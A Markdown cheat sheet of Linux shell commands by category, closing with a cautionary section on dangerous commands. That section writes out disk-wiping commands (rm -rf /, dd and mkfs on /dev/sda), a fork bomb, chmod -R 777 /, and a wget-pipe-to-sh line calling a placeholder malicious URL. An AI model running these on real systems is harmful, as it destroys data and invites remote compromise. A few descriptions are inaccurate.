Dosya Adı : linux/linuxcommandslistEng.md



			        	            Hardware Information Commands 


|			Command                               | 				Description
:------------------------------------------------:|:----------------------------------------------------------------------------:
lscpu								              | See CPU information.
lsblk								              | See information about block devices.
lspci -tv							              | Show PCI devices (graphics card, network card, etc.) in a tree-like diagram.
lsusb -tv							              | Display USB devices in a tree-like diagram.
lshw								              | List hardware configuration information.
cat /proc/cpuinfo					              | Show detailed CPU information.
cat /proc/meminfo					              | View detailed system memory information.
cat /proc/mounts					              | See mounted file systems.
free -h								              | Display free and used memory.
sudo dmidecode						              | Show hardware information from the BIOS.
hdparm -i /dev/[device_name]		              | Display disk data information.
hdparm -tT /dev/[device_name]		              | Conduct a read speed test on the device/disk.
badblocks -s /dev/[device_name]		              | Test for unreadable blocks on the device/disk.
fsck /dev/[device_name]				              | Run a disk check on an unmounted disk or partition.

-------------------------------------------------------------------------
				                          Searching Commands

|			Command                                 | 				Description
:--------------------------------------------------:|:-----------------------------------------------------------------------:
find [path] -name [search_pattern]					| Find files and directories that match the specified pattern in a specified location.
find [path] -size [+100M]							| See files and directories larger than a specified size in a directory.
grep [search_pattern] [file_name]					| Search for a specific pattern in a file with grep.
grep -r [search_pattern] [directory_name]			| Recursively search for a pattern in a directory.
locate [name]										| Locate all files and directories related to a particular name.
which [command]										| Search the command path in the $PATH environment variable.
whereis [command]									| Use the whereis command to find the source, binary, and manual page for a command.
awk '[search_pattern] {print $0}' [file_name]		| Print all lines matching a pattern in a file. 
sed 's/[old_text]/[new_text]/' [file_name]			| Find and replace text in a specified file.


-------------------------------------------------------------------------
					                    File Commands


|			Command                             | 				Description
:----------------------------------------------:|:----------------------------------------------------------------------------:
mkdir [directory_name]							| Create a new directory.
rm [file_name]									| Remove a file.
rm -r [directory_name]							| Remove a directory recursively.
rm -rf [directory_name]							| Recursively remove a directory without requiring confirmation.
cp [source_file] [destination_file]				| Copy the contents of one file to another file using the cp command.
cp -r [source_directory] [destination_directory]| Recursively copy a directory to a second directory.
mv [source_file] [destination_file]				| Move or rename files or directories.
ln -s [path]/[file_name] [link_name]			| Create a symbolic link to a file.
touch [file_name]								| Create a new file using touch.
cat [file_name]									| Show the contents of a file.
cat [source_file] >> [destination_file]			| Append file contents to another file.
head [file_name]								| Show the first ten lines of a file.
tail [file_name]								| Show the last ten lines of a file with the tail command.
more [file_name]								| Display contents of a file page by page.
less [file_name]								| Show the contents of a file with navigation using the less command.
nano [file_name]								| Open or create a file using the nano text editor.
vi [file_name]									| Open or create a file using the Vi/Vim text editor.
vim [file_name]									| Open or create a file using the Vi/Vim text editor.
gpg -c [file_name]								| Encrypt a file.
gpg [file_name].gpg								| Decrypt an encrypted .gpg file.
wc -w [file_name]								| Show the number of words, lines, and bytes in a file using wc.
ls \| xargs wc									| List the number of lines/words/characters in each file in a directory with the xargs command.
cut -d [delimiter] [file_name]					| Cut a section of a file and print the result to standard output.
[data] \| cut -d [delimiter]						| Cut a section of piped data and print the result to standard output.
shred -u [file_name]							| Overwrite a file to prevent its recovery, then delete it.
diff [first_file] [second_file]					| Compare two files and display differences.
source [file_name]								| Read and execute the file content in the current shell.
[command] \| tee [file_name] >/dev/null			| Store the command output in a file and skip the terminal output.


-------------------------------------------------------------------------
					Directory Navigation Commands

|			Command                             | 				Description
:----------------------------------------------:|:----------------------------------------------------------------------------:
ls												| List files and directories in the current directory.
ls -a											| List all files and directories in the current directory (shows hidden files).
ls -l											| List files and directories in long format.
pwd												| Show the directory you are currently working in.
cd												| Change directory to $HOME.
cd ~											| Change directory to $HOME.
cd ..											| Move up one directory level.
cd -											| Change to the previous directory.
cd [directory_path]				                |  Change location to a specified directory.
dirs											|  Show current directory stack.

-------------------------------------------------------------------------
						File Compression Commands

|			Command                                 | 				Description
:--------------------------------------------------:|:----------------------------------------------------------------------------:
tar -cf [archive.tar] [file/directory]				| Archive an existing file or directory.
tar -xf [archive.tar]								| Extract an archived file.
tar -czf [archive.tar.gz]							| Create a .gz compressed tar archive.
gzip [file_name]									| Compress or decompress .gz files.
gunzip [file_name.gz]								| Compress or decompress .gz files.
bzip2 [file_name]									| Compress or decompress .bz2 files.
bunzip2 [file_name.bz2]								| Compress or decompress .bz2 files.

-------------------------------------------------------------------------
						File Transfer Commands

|			Command                             | 				Description
:----------------------------------------------:|:----------------------------------------------------------------------------:
wget [link]		| Download files from FTP or web servers via the wget command.
curl -O [link]	| Transfer data to or from a server with various protocols using the curl command.
ftp [remote_host]	| Transfer files between local and remote systems interactively using FTP.
sftp [user]@[remote_host]	| Securely transfer between local and remote hosts using SFTP.
scp [source_file] [user]@[remote_host]:[destination_path]		| Copy a file to a server directory securely using the Linux scp command.
rsync -a [source_directory] [user]@[remote_host]:[destination_directory]	| Synchronize the contents of a directory with a backup directory using the rsync command.

-------------------------------------------------------------------------
												User and Group Commands

id																									→ See details about the active users.
last																								→ Show the last system logins.
who																									→ Display who is currently logged into the system with the who command.
w																										→ Show which users are logged in and their activity with the w command.
finger [user_name]																	→ Show user information.
sudo useradd [user_name]														→ Create a new user account.
sudo adduser [user_name]														→ Create a new user account through the adduser command interface.
sudo userdel [user_name]														→ Delete a user account.
sudo usermod -aG [group_name] [user_name]						→ Modify user information (add a user to a group).
passwd																							→ Change the current user's password or another user's password with the passwd command.
sudo passwd [user_name]															→ Change the current user's password or another user's password with the passwd command.
sudo groupadd [group_name]													→ Add a new group.
sudo groupdel [group_name]													→ Delete a group.
sudo groupmod -n [new_name] [old_name]							→ Modify a user group (change group name).
sudo [command]																			→ Temporarily elevate user privileges to superuser or root using the sudo command.
su - [user_name]																		→ Switch the user account or become a superuser.
chgrp [group_name] [file/directory]									→ Change file or directory group.

-------------------------------------------------------------------------
											Package Installation Commands
											
1. Debian and Ubuntu-Based Distributions

sudo apt-get install [package_name]			→ Install an APT package using the apt-get package utility.
sudo apt install [package_name]					→ Install an APT package using a newer APT package manager.
apt search [keyword]										→ Search for a package in the APT repositories.
apt list																→ List packages installed with APT.
apt show [package_name]									→ Show information about a package.
sudo dpkg -i [package_name.deb]					→ Install a .deb package with the Debian package manager (dpkg command).
sudo dpkg -l														→ List packages installed with dpkg.

2. Red Hat-Based Distributions (CentOS, Fedora)

sudo yum install [package_name]					→ Install a package using the YUM package manager.
yum search [keyword]										→ Find a package in the YUM repositories based on the provided keyword.
yum list installed											→ List all packages installed with YUM.
yum info [package_name]									→ Show package information for a package.
sudo dnf install [package_name]					→ Install a package using the DNF package manager.
sudo rpm -i [package_name.rpm]					→ Install a .rpm package from a local file.

3. Universal Linux Packages

sudo snap install [package_name]			→ Install a Snap package.
sudo snap find [keyword]							→ Search for a package in the Snap store.
sudo snap list												→ List installed Snap packages.
flatpak install [package_name]				→ Install a Flatpak package.
flatpak search [keyword]							→ Search for a Flatpak application in repositories.
flatpak list													→ List installed Flatpack packages.

tar -zxvf [file_name.tar.gz]
cd [extracted_directory]							Install software from source code.
./configure make
make install	

-------------------------------------------------------------------------
											Process Related Commands

ps																→ List active processes.
pstree														→ Show processes in a tree-like diagram.
pmap															→ Display a memory usage map of processes.
top																→ See all running processes.
htop															→ Interactive and colorful process viewer.
kill [process_id]									→ Terminate a Linux process under a given ID.
pkill [process_name]							→ Terminate a process under a specific name.
killall [label]										→ Terminate all processes with a given label.
prgrep [keyword]									→ List processes based on the provided keyword.
pidof [process_name]							→ Show the PID of a process.
bg																→ List and resume stopped jobs in the background.
fg																→ Bring the most recently suspended job to the foreground.
fg [job]													→ Bring a particular job to the foreground.
lsof															→ List files opened by running processes with lsof command.
trap "[commands]" [signal]				→ Catch a system error signal in a shell script. Executes provided commands when the signal is caught.
wait															→ Pause the terminal or a Bash script until a running process is completed.
nohup [command] &									→ Run a Linux process in the background.

-------------------------------------------------------------------------
								System Management and Information Commands

uname -r 													→ Show system information via uname command.
uname -a 													→ See kernel release information.
uptime 														→ Display system uptime, including the load average.
hostname													→ View system hostname.
hostname -i 											→ Show the IP address of the system.
last reboot 											→ List system reboot history.
date															→ See current time and date.
timedatectl 											→ Query and change the system clock.
cal																→ Show current calendar (month and day).
w																	→ List logged-in users.
whoami														→ See which user you are using.
finger [user_name]								→ Show information about a particular user.
ulimit [flags] [limit]						→ View or limit system resource amounts.
shutdown [hh:mm]									→ Schedule a system shutdown.
shutdown now											→ Shut down the system immediately.
modprobe [module_name]						→ Add a new kernel module.
dmesg															→ Show bootup messages.

-------------------------------------------------------------------------
														Disk Usage Commands

df -h																			→ Check free and used space on mounted systems.
df -i																			→ Show free inodes on mounted file systems.
fdisk -l																	→ Display disk partitions, sizes, and types with the command.
du -ah																		→ See disk usage for all files and directories.
du -sh																		→ Show disk usage of the current directory.
mount																			→ Show currently mounted file systems.
findmnt																		→ Display target mount point for all file systems.
mount [device_path] [mount_point]					→ Mount a device.

-------------------------------------------------------------------------
												SSH Login Commands

ssh [user_name]@[remote_host]																	→ Connect to a remote host as a user via SSH.
ssh [host]																										→ Securely connect to a host via SSH default port 22.
ssh -p [port] [user_name]@[remote_host]												→ Connect to the host using a particular port.
ssh-keygen																										→ Generate SSH key pairs.
sudo service sshd start																				→ Start SSH server daemon.
scp [file_name] [user_name]@[remote_host]:[remote_path]				→ Securely copy files between local and remote systems via SSH.
sftp [user_name]@[remote_host]																→ Interactive file transfer over encrypted SSH session using SFTP protocol.
telnet [host]																									→ Connect to the host via Telnet default port 23.

-------------------------------------------------------------------------
										File Permission Commands

chmod 777 [file_name]						→ Assign read, write, and execute file permission to everyone (rwxrwxrwx).
chmod 755 [file_name]						→ Give read, write, and execute permission to owner, and read and execute permission to group and others (rwxr-xr-x).
chmod 766 [file_name]						→ Assign full permission to the owner, and read and write permission to the group and others (rwxrw-rw-).
chown [user_name] [file_name]		→ Change the ownership of a file with chown command.
chown [user_name]:[group_name] [file_name]			→ Change the owner and group ownership of a file.

-------------------------------------------------------------------------
												Network Commands

ip addr show														→ List IP addresses and network interfaces.
ip address add [IP_address]							→ Assign an IP address to interface eth0.
ifconfig																→ Display IP addresses of all network interfaces.
ping [remote_host]											→ Ping remote host.
netstat -pnltu													→ See active (listening) ports with the netstat command.
netstat -tuln														→ Show TCP and UDP ports and their programs.
whois [domain_name]											→ Display more information about a domain.
dig [domain_name]												→ Show DNS information about a domain using the dig command.
dig -x [domain_name]										→ Do a reverse DNS lookup on the domain.
dig -x [IP_address]											→ Do a reverse DNS lookup of an IP address.
host [domain_name]											→ Perform an IP lookup for a domain.
hostname -I															→ Show the local IP address.
nslookup [domain_name]									→ Receive information about an internet domain.

-------------------------------------------------------------------------
											Variable Commands

let "[variable_name]=[value]"						→ Assign an integer value to a variable.
export [variable_name]									→ Export a Bash variable.
declare [variable-name]= "[value]"			→ Declare a Bash variable.
set																			→ List the names of all the shell variables and functions.
unset [variable_name]										→ Remove an environment variable.
echo $[variable-name]										→ Display the value of a variable.

-------------------------------------------------------------------------
											Shell Command Management

alias [alias-name]='[command]'									→ Create an alias for a command.
watch -n [interval-in-seconds] [command]				→ Set a custom interval to run a user-defined command.
sleep [time-interval] && [command]							→ Postpone the execution of a command.
at [hh:mm]																			→ Create a job to be executed at a certain time (Ctrl+D to exit prompt after you type in the command).
man [command]																		→ Display a built-in manual for a command.
history																					→ Print the command history used in the terminal.

-------------------------------------------------------------------------
									Linux Shell Keyboard Shortcuts

Ctrl + C			→ Kill process running in the terminal.
Ctrl + Z			→ Stop the current process. The process can be resumed in the foreground with fg or in the background with bg.
Ctrl + W			→ Cut one word before the cursor and add it to the clipboard.
Ctrl + U			→ Cut part of the line before the cursor and add it to the clipboard.
Ctrl + K			→ Cut part of the line after the cursor and add it to the clipboard.
Ctrl + Y			→ Paste from clipboard.
Ctrl + R			→ Recall the last command that matches the provided characters.
Ctrl + O			→ Run the previously recalled command.
Ctrl + G			→ Exit command history without running a command.
clear					→ Clear the terminal screen.
!!						→ Run the last command again.
exit					→ Log out of the current session.

-------------------------------------------------------------------------
									Dangerous Linux Terminal Commands
									
1. rm -rf /   Command

$ rm -rf /

The rm command in Linux allows you to delete files and directories. However, there is no undelete option, which makes the deleted files gone forever. That means that using the rm command to permanently remove sensitive system files would cause system instability. Running the rm command with the -r and -f flags forces a recursive deletion through all subdirectories. Running it on the / root directory would wipe the system entirely.

Note: Some Linux systems issue a warning before executing this command, like in the screenshot, while others won't.


2. Command  >/dev/sda

$ command >/dev/sda

Executing a command and appending it with >/dev/sda writes the command's output on the /dev/sda block, i.e., on your hard drive. The dev/sda block contains filesystem data, which is then replaced with the command output, damaging your system and making it irrecoverable. The command can be any Linux command. For example, executing the shred command destroys all the data on the drive.


3. :(){ :|:& };: Fork Bomb

$ :(){ :|:& };:

The fork bomb command creates a function called : and defines the contents of the function, making it execute itself and pipe into another call of itself. Thus, the function runs in the foreground while making the same process run in the background. The function executes and replicates itself repeatedly, quickly taking up all your resources until the system freezes. 

Note: The fork bomb is also called the Rabbit Virus or Wabbit, and it is essentially a DOS attack. You can defend against this type of attack by limiting your session to fewer processes. Run: ulimit -S -u 5000 to limit the process number to 5000. 


4. > file Command

The > file command is short for cat /dev/null > file.

Redirecting a command to a file can be very useful, but making a mistake in the command syntax or running the command carelessly can wipe out a critical system file.

The > file command uses the bash redirection feature to flush a file's contents, wiping it clean.

For example, run:

$ > examplefile.conf

The output creates an empty configuration file. Additionally, prepending a whitespace before the command prevents it from appearing in the log in Bash shell. This means that someone can flush your files, and there will be no trace left if they precede the command with a whitespace.


5. mv directory /dev/null

Another dangerous command you can find online is to move a directory or file to /dev/null. In Linux, /dev/null is a file known as "the black hole" because it destroys any data that you move to the file's location. However, since /dev/null is not a directory, but a character file, mv cannot overwrite it with another directory. On the other hand, you can move a file there, and the file overwrites the content of /dev/null.

For example:

$ sudo mv /home/busra/employees.txt /dev/null

After running this command, /dev/null is a regular file. The danger in making that change is that /dev/null is never supposed to output any data, and now it is a regular file. With that configuration being wrong, it can lead to random data being inserted into system files, leading to a broken system.


6. wget http://malicious_source_url -O-|sh

The wget command allows you to download files in the terminal. However, the command may instruct wget to download a script from a malicious source and execute it with sh. Always pay attention to the address of the package or file you are downloading, and make sure it is a trusted source, or else you risk infecting your system.

7. crontab -r

The crontab command helps automate everyday tasks. However, all the commands and instructions are kept in a single crontab file, which can be removed by specifying the -r flag. This can happen by mistake when you want to specify the -e flag and accidentally enter -r. Beware because there is no yes/no prompt before removing the file. Make sure to back up your crontab file as there aren't many recovery options once deleted.


8. history | sh

The history | sh command can be dangerous because it executes every command from the command log that you have already executed. The action can cause system instability and execute commands that you didn't want to execute again.


9. dd if=/dev/zero of=/dev/sda

The dd command instructs the system to write data to physical drives. The data source is defined in the if parameter, which can be random of if you want to write random data to the block. The if parameter can also be zero of if you want to zero out your hard drive. Either choice removes the OS from the drive.

For example:

$ dd if=/dev/random of=/dev/sda

Running the command above fills your hard drive with random data, causing your system to fail.


10. mkfs.ext3 /dev/sda

The mkfs command creates a new filesystem on the specified device. Running mkfs could be dangerous if you didn't back up your data before running the command. It formats the specified partition/hard drive, completely wiping all data from it.

Warning: While it is useful to format disk partitions, formatting an entire hard drive (such as /dev/sda) leaves the system irrecoverable. 

In the following example, mkfs creates a new ext.3 filesystem after formatting the entire hard drive:

$ mkfs.ext3 /dev/sda

Since the command formats the entire hard drive to make a new filesystem, the system is no longer bootable and outputs the following error:

FATAL: No bootable medium found! System halted.

Depending on your preferences, you can also instruct mkfs to create a different filesystem, such as ext4. You can also choose to format a single partition or a different hard drive, specified in place of /dev/sda:

$ mkfs.ext4 /dev/sda1

In the example above, we instructed mkfs to create an ext4 filesystem on the first partition on the first hard drive.

11. gunzip untrusted.gz

Unzipping an untrusted archive may turn out to be a zip bomb, also known as a decompression bomb. A zip bomb is a malicious file that attacks the system trying to read it. When decompressing the file, it occupies a lot of disk space, which can be fatal for many system services. So, it is best to be careful when handling archives from untrusted sources, mainly because the zip bomb is one of the oldest malicious files on the internet.


12. Remove Python

Before you think about removing an older version of Python from your Linux system, be aware that the system requires a working python2 installation to function correctly. Uninstalling the default Python version on Ubuntu causes the Graphical Display Manager used for logging into the system to fail, and you get locked out of your system. However, if you know what you are doing, you can uninstall Python2.x.x and all its dependencies by running:

$ sudo apt purge python2.x-minimal


13. chmod -R 777 /

Linux is a multi-user system, and the chmod command allows you to change file permissions to configure user access to a certain file or directory. However, chmod can recursively change the permissions of all your files:

$ chmod -R 777 /

The command above allows all users to read, write, and execute all files on the system, which compromises security. Additionally, certain systems may malfunction if the permissions are too open and prevent the system from booting.

-------------------------------------------------------------------------




-------------------------------------------------------------------------


